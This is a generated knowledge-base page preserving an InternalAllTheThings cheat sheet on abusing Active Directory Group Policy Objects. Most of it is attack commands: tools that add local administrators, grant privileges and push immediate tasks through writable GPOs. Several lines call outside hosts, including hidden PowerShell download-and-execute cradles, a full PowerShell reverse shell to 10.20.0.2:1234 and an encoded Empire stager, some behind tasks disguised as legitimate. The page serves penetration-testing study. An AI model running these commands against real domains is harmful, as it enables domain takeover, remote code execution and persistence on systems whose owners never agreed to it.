---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Group Policy Objects

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adds-group-policy-objects` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-group-policy-objects.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Group Policy Objects](../../topics/active-directory/active-directory-group-policy-objects.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adds-group-policy-objects |
| name | Active Directory - Group Policy Objects |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adds-group-policy-objects.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Group Policy Objects\n\n> Creators of a GPO are automatically granted explicit Edit settings,\
  \ delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead,\
  \ WriteDacl, WriteOwner\n\n:triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local\n\nGPO\
  \ are stored in the DC in `\\\\<domain.dns>\\SYSVOL\\<domain.dns>\\Policies\\<GPOName>\\`, inside two folders **User** and\
  \ **Machine**.\nIf you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are\
  \ located at `Machine\\Preferences\\ScheduledTasks`.\n\n:warning: Domain members refresh group policy settings every 90\
  \ minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: `gpupdate /force`.\n\
  \n## Find vulnerable GPO\n\nLook a GPLink where you have the **Write** right.\n\n```powershell\nGet-DomainObjectAcl -Identity\
  \ \"SuperSecureGPO\" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match \"GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner\"\
  )}\n```\n\n* [cogiceo/GPOHound](https://github.com/cogiceo/GPOHound) - Offensive GPO dumping and analysis tool that leverages\
  \ and enriches BloodHound data.\n\n```ps1\npipx install \"git+https://github.com/cogiceo/GPOHound\"\ngpohound dump --json\n\
  gpohound dump --list --gpo-name\ngpohound dump --guid 21246D99-1426-495B-9E8E-556ABDD81F94\ngpohound dump --file scripts\
  \ psscripts\ngpohound dump --search 'VNC.*Server' --show\ngpohound analysis --json\ngpohound analysis --processed --object\
  \ group registry\ngpohound analysis --guid CCF6CAE3-E280-4109-8F9D-25461DBB5D67 --affected\ngpohound analysis --computer\
  \ 'SRV-PA-03.NORTH.SEVENKINGDOMS.LOCAL' --order\ngpohound analysis --enrich\n```\n\n## Abuse GPO with SharpGPOAbuse\n\n\
  * [FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) - SharpGPOAbuse is a .NET application written\
  \ in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise\
  \ the objects that are controlled by that GPO.\n\n```powershell\n# Build and configure SharpGPOAbuse\nInstall-Package CommandLineParser\
  \ -Version 1.9.3.15\nILMerge.exe /out:C:\\SharpGPOAbuse.exe C:\\Release\\SharpGPOAbuse.exe C:\\Release\\CommandLine.dll\n\
  \n# Adding User Rights\n.\\SharpGPOAbuse.exe --AddUserRights --UserRights \"SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight\"\
  \ --UserAccount bob.smith --GPOName \"Vulnerable GPO\"\n\n# Adding a Local Admin\n.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount\
  \ bob.smith --GPOName \"Vulnerable GPO\"\n\n# Configuring a User or Computer Logon Script\n.\\SharpGPOAbuse.exe --AddUserScript\
  \ --ScriptName StartupScript.bat --ScriptContents \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\
  \"\" --GPOName \"Vulnerable GPO\"\n\n# Configuring a Computer or User Immediate Task\n# /!\\ Intended to \"run once\" per\
  \ GPO refresh, not run once per system\n.\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author DOMAIN\\Admin\
  \ --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\
  \"\" --GPOName \"Vulnerable GPO\"\n.\\SharpGPOAbuse.exe --AddComputerTask --GPOName \"VULNERABLE_GPO\" --Author 'LAB.LOCAL\\\
  User' --TaskName \"EvilTask\" --Arguments  \"/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND \" --Command \"\
  cmd.exe\" --Force\n```\n\n## Abuse GPO with PowerGPOAbuse\n\n* [rootSySdk/PowerGPOAbuse](https://github.com/rootSySdk/PowerGPOAbuse)\
  \ - Powershell version of SharpGPOAbuse.\n\n```ps1\nPS> . .\\PowerGPOAbuse.ps1\n\n# Adding a localadmin \nPS> Add-LocalAdmin\
  \ -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'\n\n# Assign a new right \nPS> Add-UserRights -Rights \"SeLoadDriverPrivilege\"\
  ,\"SeDebugPrivilege\" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'\n\n# Adding a New Computer/User script \nPS> Add-ComputerScript/Add-UserScript\
  \ -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'\n\n# Create an immediate\
  \ task \nPS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments \"'$(Get-Content evil.ps1)'\"\
  \ -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'\n```\n\n## Abuse GPO with pyGPOAbuse\n\n* [Hackndo/pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)\
  \ - Partial python implementation of SharpGPOAbuse.\n\n```powershell\n# Add john user to local administrators group (Password:\
  \ H4x00r123..)\n./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\"\n\n# Reverse\
  \ shell example\n./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\" \\ \n    -powershell\
  \ \\ \n    -command \"\\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\\$stream = \\$client.GetStream();[byte[]]\\\
  $bytes = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName\
  \ System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\\
  $sendback + 'PS ' + (pwd).Path + '> ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\\
  $sendbyte.Length);\\$stream.Flush()};\\$client.Close()\" \\ \n    -taskname \"Completely Legit Task\" \\\n    -description\
  \ \"Dis is legit, pliz no delete\" \\ \n    -user\n```\n\n## Abuse GPO with PowerView\n\n```powershell\n# Enumerate GPO\n\
  Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}\n\n# New-GPOImmediateTask to push an Empire stager out to machines\
  \ via VulnGPO\nNew-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden\
  \ -Enc AAAAAAA...' -Force\n```\n\n## Abuse GPO with StandIn\n\n* [FuzzySecurity/StandIn](https://github.com/FuzzySecurity/StandIn)\
  \ - StandIn is a small .NET35/45 AD post-exploitation toolkit.\n\n```powershell\n# Add a local administrator\nStandIn.exe\
  \ --gpo --filter Shards --localadmin user002\n\n# Set custom right to a user\nStandIn.exe --gpo --filter Shards --setuserrights\
  \ user002 --grant \"SeDebugPrivilege,SeLoadDriverPrivilege\"\n\n# Execute a custom command\nStandIn.exe --gpo --filter Shards\
  \ --tasktype computer --taskname Liber --author \"REDHOOK\\Administrator\" --command \"C:\\I\\do\\the\\thing.exe\" --args\
  \ \"with args\"\n```\n\n## Abuse GPO with GroupPolicyBackdoor\n\n* [synacktiv/GroupPolicyBackdoor](https://github.com/synacktiv/GroupPolicyBackdoor)\
  \ - Group Policy Objects manipulation and exploitation framework\n\n```ps1\n# Add Immediate Task to your target GPO\npython3\
  \ gpb.py gpo inject --domain 'corp.com' --dc 'ad01-dc.corp.com' -k --module modules_templates/ImmediateTask_create.ini --gpo-name\
  \ 'TARGET_GPO'\n\n# Clean\npython3 gpb.py gpo clean --domain 'corp.com' --dc 'ad01-dc.corp.com' -k --state-folder 'state_folders/2025_07_15_075047'\n\
  ```\n\n**ImmediateTask_create.ini**:\n\n```ps1\n[MODULECONFIG]\nname = Scheduled Tasks\ntype = computer\n\n[MODULEOPTIONS]\n\
  task_type = immediate\nprogram = cmd.exe\narguments = /c \"whoami > C:\\Temp\\poc.txt\"\n\n[MODULEFILTERS]\nfilters =\n\
  \    [{\n        \"operator\": \"AND\",\n        \"type\": \"Computer Name\",\n        \"value\": \"ad01-srv1.corp.com\"\
  \n    }]\n```\n\n## References\n\n* [A Red Teamer's Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)\n\
  * [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)\n\
  * [Abusing sAMAccountName Hijacking in \"GPP: Local Users and Groups\" - @toffyrak - June 12, 2025](https://www.cogiceo.com/en/whitepaper_gpphijacking/)\n\
  * [GPO Abuse - Part 1 - RastaMouse - 6 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-1/)\n* [GPO Abuse - Part\
  \ 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)\n* [GPO Abuse: \"You can't see me\"\
  \ - Huy Kha -  July 19, 2019](https://pentestmag.com/gpo-abuse-you-cant-see-me/)\n* [Training - Attacking and Defending\
  \ Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)"
_relative_path: active-directory/ad-adds-group-policy-objects.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-group-policy-objects.md
````
